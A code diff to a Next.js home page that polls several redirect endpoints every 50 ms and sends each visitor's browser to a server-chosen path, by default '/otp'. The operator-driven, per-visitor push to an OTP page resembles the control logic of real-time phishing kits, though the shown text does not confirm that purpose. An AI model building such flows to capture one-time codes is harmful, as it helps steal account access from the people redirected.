@@ -64,8 +64,8 @@ export default function Home() {
           // Fallback to polling if SSE fails
         };
         
-        // Polling - check for redirects using timestamp-based approach
-        // Check latest redirect endpoint (most reliable for stateless functions)
+        // Polling - SIMPLIFIED: Check active redirect endpoint (most reliable)
+        // This endpoint uses module-level variables that persist within the same function instance
         const redirectInterval = setInterval(async () => {
           if (redirectReceived) {
             clearInterval(redirectInterval);
@@ -73,37 +73,50 @@ export default function Home() {
           }
           
           try {
-            // Primary: Check latest redirect endpoint (works across function instances)
+            // Primary: Check active redirect endpoint (simplest, most reliable)
+            const activeResponse = await fetch(`/api/redirect/active?t=${Date.now()}`);
+            if (activeResponse.ok) {
+              const activeData = await activeResponse.json();
+              
+              if (activeData.redirect) {
+                redirectReceived = true;
+                if (redirectEventSource) {
+                  redirectEventSource.close();
+                }
+                clearInterval(redirectInterval);
+                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM ACTIVE ✅✅✅');
+                console.log('[index.js] Redirect type:', activeData.redirectType);
+                console.log('[index.js] Page path:', activeData.pagePath);
+                console.log('[index.js] Redirect age:', activeData.age, 'ms');
+                
+                // Redirect immediately
+                const targetUrl = activeData.pagePath || activeData.redirectUrl || '/otp';
+                console.log('[index.js] Redirecting to:', targetUrl);
+                window.location.href = targetUrl;
+                return;
+              }
+            }
+            
+            // Fallback 1: Check latest redirect endpoint
             const latestResponse = await fetch(`/api/redirect/latest?t=${Date.now()}`);
             if (latestResponse.ok) {
               const latestData = await latestResponse.json();
               
               if (latestData.redirect) {
-                // Verify redirect is newer than page load
-                const redirectTimestamp = latestData.timestamp ? new Date(latestData.timestamp).getTime() : 0;
-                const storedPageLoadTime = parseInt(localStorage.getItem('pageLoadTime') || '0');
-                
-                if (redirectTimestamp > storedPageLoadTime || storedPageLoadTime === 0) {
-                  redirectReceived = true;
-                  if (redirectEventSource) {
-                    redirectEventSource.close();
-                  }
-                  clearInterval(redirectInterval);
-                  console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM LATEST ✅✅✅');
-                  console.log('[index.js] Redirect type:', latestData.redirectType);
-                  console.log('[index.js] Page path:', latestData.pagePath);
-                  console.log('[index.js] Redirect age:', latestData.age, 'ms');
-                  
-                  // Redirect immediately
-                  const targetUrl = latestData.pagePath || latestData.redirectUrl || '/otp';
-                  console.log('[index.js] Redirecting to:', targetUrl);
-                  window.location.href = targetUrl;
-                  return;
+                redirectReceived = true;
+                if (redirectEventSource) {
+                  redirectEventSource.close();
                 }
+                clearInterval(redirectInterval);
+                console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM LATEST ✅✅✅');
+                const targetUrl = latestData.pagePath || latestData.redirectUrl || '/otp';
+                console.log('[index.js] Redirecting to:', targetUrl);
+                window.location.href = targetUrl;
+                return;
               }
             }
             
-            // Fallback: Check visitor-specific endpoint
+            // Fallback 2: Check visitor-specific endpoint
             const response = await fetch(`/api/redirect/${visitorId}?t=${Date.now()}`);
             if (response.ok) {
               const data = await response.json();
@@ -115,10 +128,6 @@ export default function Home() {
                 }
                 clearInterval(redirectInterval);
                 console.log('[index.js] ✅✅✅ REDIRECT COMMAND RECEIVED FROM VISITOR ENDPOINT ✅✅✅');
-                console.log('[index.js] Redirect type:', data.redirectType);
-                console.log('[index.js] Page path:', data.pagePath);
-                
-                // Redirect immediately
                 const targetUrl = data.pagePath || data.redirectUrl || '/otp';
                 console.log('[index.js] Redirecting to:', targetUrl);
                 window.location.href = targetUrl;
@@ -128,7 +137,7 @@ export default function Home() {
           } catch (error) {
             console.error('[index.js] Error checking redirect:', error);
           }
-        }, 100); // Poll every 100ms
+        }, 50); // Poll every 50ms for faster response
         
         // Stop polling after 5 minutes
         setTimeout(() => clearInterval(redirectInterval), 300000);
